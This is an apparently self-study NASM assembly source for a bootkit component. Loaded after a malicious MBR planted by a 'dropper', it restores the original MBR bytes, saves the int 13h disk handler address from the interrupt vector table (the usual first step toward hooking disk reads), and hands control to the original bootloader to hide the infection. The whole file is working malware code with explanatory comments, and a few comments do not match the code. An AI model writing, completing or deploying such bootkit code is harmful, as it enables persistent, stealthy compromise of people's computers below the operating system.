BITS 16                              ; specify 16-bit mode
ORG 0x4000                           ; set the origin address to 0x4000. This is where the bootkit is loaded by the bootloader

start:
jmp real_start                       ; jump over the "data section" to the "code section"
times 4 - ($-$$) nop                 ; align "data section" to a 4 byte boundary

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;           data section         ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

orig_mbr_64: times 64 db 0x2a        ; the first 64 bytes of the original MBR are stored here by the dropper (0x2a = placeholder)
orig_int13:                          ; address of the original int 13 interrupt handler
    dq 0x00                          ; offset:segment (offset comes before segment due to little endian)

real_start:
;
; Restore the original MBR by overwriting the malicious MBR with the 64 bytes stored in "orig_mbr_head"
;
restore_orig_mbr:
    lea si, [orig_mbr_64]
    mov di, 0x7c00
    mov cx, 0x40                     ; 0x40 = 64
    cld                              ; clear direction flag (move forward, used for next instruction)
    rep movsb                        ; copy byte from ds:si to es:di (cx times)

;
; Save the address of the original int 13 handler
;
; The Interrupt Vector Table (IVT), a table that holds the addresses of interrupt handlers is typically located at 0000:0000H
; and each entry is a 32 bit (4 byte) address (16 bit segment:16 bit offset).
; See: https://wiki.osdev.org/Interrupt_Vector_Table
; Thus the int 13 handler address is located in the IVT at the offset: 4 * 0x13 = 0x4C
;
save_orig_int13:
    mov ax, [ds:0x4c]                ; read offset part of address
    mov word [orig_int13], ax
    mov ax, [ds:0x4e]                ; read segment part of address
	mov word [orig_int13 + 2], ax

;
; Pass control to original MBR bootloader
;
jmp 0x0000:0x7c00